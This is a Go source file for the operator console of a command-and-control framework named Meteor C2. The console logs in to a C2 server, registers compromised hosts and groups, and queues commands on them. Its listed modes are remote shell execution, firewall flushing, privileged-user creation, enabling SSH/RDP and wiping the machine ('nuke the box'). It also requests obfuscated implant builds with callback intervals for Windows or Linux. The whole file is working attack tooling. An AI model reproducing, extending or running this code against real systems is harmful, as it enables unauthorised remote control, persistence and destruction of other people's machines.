package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/degenerat3/meteor/pbuf"
	"github.com/golang/protobuf/proto"
	"golang.org/x/crypto/ssh/terminal"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"syscall"
)

func login() {
	fmt.Println("LOGIN")
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Username: ")
	un, _ := reader.ReadString('\n')
	un = strings.TrimSuffix(un, "\n")
	un = strings.TrimSuffix(un, "\r")
	DTUSER = un
	fmt.Print("Enter Password: ")
	bytePassword, _ := terminal.ReadPassword(int(syscall.Stdin))
	pw := string(bytePassword)
	fmt.Println()

	authdat := &mcs.AuthDat{
		Username: un,
		Password: pw,
	}
	hostReg1 := &mcs.MCS{
		AuthDat: authdat,
	}
	hdata1, err := proto.Marshal(hostReg1)
	if err != nil {
		panic(err)
	}
	url := "http://" + DTSERVER + "/login"
	resp, err := http.Post(url, "", bytes.NewBuffer(hdata1))
	if err != nil {
		panic(err)
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		panic(err)
	}
	tok := stat.GetDesc()
	if tok == "Invalid user or password" {
		fmt.Println("Error: Invalid username or password")
		os.Exit(0)
	}
	authToken = tok
}

func generateAuthData() *mcs.AuthDat {
	authdat := &mcs.AuthDat{
		Token: authToken,
	}
	return authdat
}

func registerHostReq(host string) {
	hostInfo := strings.Split(host, ":")
	fmt.Printf("Registering host: %s\n", hostInfo[0])
	hostReg := &mcs.MCS{
		Hostname:  hostInfo[0],
		Interface: hostInfo[1],
		AuthDat:   generateAuthData(),
	}
	hdata, err := proto.Marshal(hostReg)
	if err != nil {
		fmt.Println("Error: ", err.Error())
		os.Exit(1)
	}
	url := "http://" + DTSERVER + "/register/host"
	resp, err := http.Post(url, "", bytes.NewBuffer(hdata))
	if err != nil {
		fmt.Println("Error: ", err.Error())
		os.Exit(1)
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		panic(err)
	}
	fmt.Printf("Status: %d\n", stat.GetStatus())
	return
}

func registerGroupReq(group string) {
	groupInfo := strings.Split(group, "--")
	fmt.Printf("Registering group: %s\n", groupInfo[0])
	groupReg := &mcs.MCS{
		Groupname: groupInfo[0],
		Desc:      groupInfo[1],
		AuthDat:   generateAuthData(),
	}
	gdata, _ := proto.Marshal(groupReg)
	url := "http://" + DTSERVER + "/register/group"
	resp, err := http.Post(url, "", bytes.NewBuffer(gdata))
	if err != nil {
		panic(err)
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		panic(err)
	}
	fmt.Printf("Status: %d\n", stat.GetStatus())
	return
}

func registerHostGroupReq(host string, group string) {
	gn := strings.Split(group, "--")[0]
	fmt.Printf("Adding '%s' to the '%s' group\n", host, gn)
	groupReg := &mcs.MCS{
		Groupname: gn,
		Hostname:  host,
		AuthDat:   generateAuthData(),
	}
	gdata, _ := proto.Marshal(groupReg)
	url := "http://" + DTSERVER + "/register/hostgroup"
	resp, err := http.Post(url, "", bytes.NewBuffer(gdata))
	if err != nil {
		panic(err)
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		panic(err)
	}
	fmt.Printf("Status: %d\n", stat.GetStatus())
	return
}

func handleActionKW(splitargs []string) string {
	if len(splitargs) < 3 {
		return "Error: not enough args"
	}
	hst := splitargs[0]
	md := splitargs[1]
	com := strings.Join(splitargs[2:], " ")
	actReg := &mcs.MCS{
		Mode:     md,
		Args:     com,
		Hostname: hst,
		AuthDat:  generateAuthData(),
	}
	bdata, _ := proto.Marshal(actReg)
	url := "http://" + DTSERVER + "/add/action/single"
	resp, err := http.Post(url, "", bytes.NewBuffer(bdata))
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	if stat.GetStatus() != 200 {
		return "Error queuing action" + string(stat.GetStatus())
	}
	return "Successfully queued action '" + stat.GetUuid() + "' targeting: " + hst
}

func handleGroupActionKW(splitargs []string) string {
	if len(splitargs) < 3 {
		return "Error: not enough args"
	}
	grp := splitargs[0]
	md := splitargs[1]
	com := strings.Join(splitargs[2:], " ")
	actReg := &mcs.MCS{
		Mode:      md,
		Args:      com,
		Groupname: grp,
		AuthDat:   generateAuthData(),
	}
	bdata, _ := proto.Marshal(actReg)
	url := "http://" + DTSERVER + "/add/action/group"
	resp, err := http.Post(url, "", bytes.NewBuffer(bdata))
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	if stat.GetStatus() != 200 {
		return "Error queuing action" + string(stat.GetStatus())
	}
	return "Successfully queued actions targeting: " + grp
}

func handleResultKW(splitargs []string) string {
	if len(splitargs) < 1 {
		return "Error: missing argument"
	}
	resReg := &mcs.MCS{
		Uuid:    splitargs[0],
		AuthDat: generateAuthData(),
	}
	bdata, _ := proto.Marshal(resReg)
	url := "http://" + DTSERVER + "/list/result"
	resp, err := http.Post(url, "", bytes.NewBuffer(bdata))
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	if stat.GetStatus() != 200 {
		return "Error querying action\n"
	}
	decoded, err := base64.StdEncoding.DecodeString(stat.GetDesc())
	if err != nil {
		return "Error decoding base64 data\n"
	}
	return string(decoded)
}

func handleListKW(splitargs []string) string {
	if len(splitargs) < 1 {
		return "Error: missing argument"
	}
	var ret string
	switch splitargs[0] {
	case "modes":
		ret = handleListModes()
	case "hosts":
		ret = handleListHosts()
	case "host":
		ret = handleListHost(splitargs)
	case "groups":
		ret = handleListGroups()
	case "group":
		ret = handleListGroup(splitargs)
	case "bots":
		ret = handleListBots()
	case "actions":
		ret = handleListActions()
	default:
		ret = "Error: Unknown entity '" + splitargs[0] + "', cannot list"
	}
	return ret
}

func handleHelpKW() string {
	ret := fmt.Sprintf(`Daddy_Tops CLI: Interactive Commander for Meteor C2
	
Current Server Config:
Server: %s
User: %s
	
CAPABILITY				SYNTAX
------------------------------------------------------------------------------------------

NEW ACTION:             action <%%target_hostname%%> <%%mode_code%%> <%%arguments%%>
NEW GROUP ACTION:       gaction <%%target_groupname%%> <%%mode_code%%> <%%arguments%%>
SHOW RESULT:            result <%%uuid%%>
LIST AVAILABLE <X>:     list <modes/hosts/host/groups/group/bots/actions> <OPT:%%host%%/%%group%%>
BUILD REQUEST:          build <agent/*>             // more build options coming in the future
HELP MENU               help
QUIT PROMPT             exit
`, DTSERVER, DTUSER)
	return ret
}

func handleExitKW() string {
	return "Goodbye " + DTUSER + "!\n"
}

func handleListModes() string {
	return `
MODE    DESC                ARGS	
-------------------------------------
  1     shell exec          <shell command>
  2     firewall flush      N/A
  3     create priv user    <username>
  4     enable SSH/RDP      N/A
  F     nuke the box        N/A
`
}

func handleListHosts() string {
	url := "http://" + DTSERVER + "/list/hosts"
	resp, err := http.Get(url)
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	return stat.GetDesc()
}

func handleListHost(splitargs []string) string {
	if len(splitargs) < 2 {
		return "Error: not enough args"
	}
	hst := splitargs[1]
	actReg := &mcs.MCS{
		Hostname: hst,
		AuthDat:  generateAuthData(),
	}
	bdata, _ := proto.Marshal(actReg)
	url := "http://" + DTSERVER + "/list/host"
	resp, err := http.Post(url, "", bytes.NewBuffer(bdata))
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	if stat.GetStatus() != 200 {
		estr := fmt.Sprintf("Error listing host: %d\n", stat.GetStatus())
		return estr
	}
	return stat.GetDesc()
}

func handleListGroups() string {
	url := "http://" + DTSERVER + "/list/groups"
	resp, err := http.Get(url)
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	return stat.GetDesc()
}

func handleListGroup(splitargs []string) string {
	if len(splitargs) < 2 {
		return "Error: not enough args"
	}
	grp := splitargs[1]
	actReg := &mcs.MCS{
		Groupname: grp,
		AuthDat:   generateAuthData(),
	}
	bdata, _ := proto.Marshal(actReg)
	url := "http://" + DTSERVER + "/list/group"
	resp, err := http.Post(url, "", bytes.NewBuffer(bdata))
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	if stat.GetStatus() != 200 {
		estr := fmt.Sprintf("Error listing group: %d\n", stat.GetStatus())
		return estr
	}
	return stat.GetDesc()
}

func handleListBots() string {
	url := "http://" + DTSERVER + "/list/bots"
	resp, err := http.Get(url)
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	return stat.GetDesc()
}

func handleListActions() string {
	url := "http://" + DTSERVER + "/list/actions"
	resp, err := http.Get(url)
	if err != nil {
		return err.Error()
	}
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	stat := &mcs.MCS{}
	proto.Unmarshal(data, stat)
	if err != nil {
		return err.Error()
	}
	return stat.GetDesc()
}

func handleBuild(splitargs []string) string {
	var retval string
	if len(splitargs) < 1 {
		return "Error: missing arg"
	}
	if splitargs[0] == "agent" {
		retval = handleBuildAgent()
	}
	return retval
}

func handleBuildAgent() string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("\nClient type (petrie | cera | little_foot): ")
	cn, _ := reader.ReadString('\n')
	cn = strings.TrimSuffix(cn, "\n")
	cn = strings.TrimSuffix(cn, "\r")
	fmt.Print("\nServer (including port if applicable): ")
	srv, _ := reader.ReadString('\n')
	srv = strings.TrimSuffix(srv, "\n")
	srv = strings.TrimSuffix(srv, "\r")
	fmt.Print("\nReg file path: ")
	rf, _ := reader.ReadString('\n')
	rf = strings.TrimSuffix(rf, "\n")
	rf = strings.TrimSuffix(rf, "\r")
	fmt.Print("\nObfuscation text: ")
	obf, _ := reader.ReadString('\n')
	obf = strings.TrimSuffix(obf, "\n")
	obf = strings.TrimSuffix(obf, "\r")
	fmt.Print("\nCallback interval (Seconds): ")
	intv, _ := reader.ReadString('\n')
	intv = strings.TrimSuffix(intv, "\n")
	intv = strings.TrimSuffix(intv, "\r")
	fmt.Print("\nCallback delta (Seconds): ")
	dlt, _ := reader.ReadString('\n')
	dlt = strings.TrimSuffix(dlt, "\n")
	dlt = strings.TrimSuffix(dlt, "\r")
	fmt.Print("\nTarget OS (windows | linux): ")
	tos, _ := reader.ReadString('\n')
	tos = strings.TrimSuffix(tos, "\n")
	tos = strings.TrimSuffix(tos, "\r")
	fmt.Print("\nDebug mode (true | false): ")
	dbg, _ := reader.ReadString('\n')
	dbg = strings.TrimSuffix(dbg, "\n")
	dbg = strings.TrimSuffix(dbg, "\r")

	reqBody, err := json.Marshal(map[string]string{
		"ClientName": cn,
		"Server":     srv,
		"RegFile":    rf,
		"ObfText":    obf,
		"Interval":   intv,
		"Delta":      dlt,
		"TargetOS":   tos,
		"Debug":      dbg,
	})
	if err != nil {
		return err.Error()
	}
	url := "http://" + DTSERVER + "/buildreq"
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(reqBody))
	if err != nil {
		return err.Error()
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error()
	}
	return string(body)
}
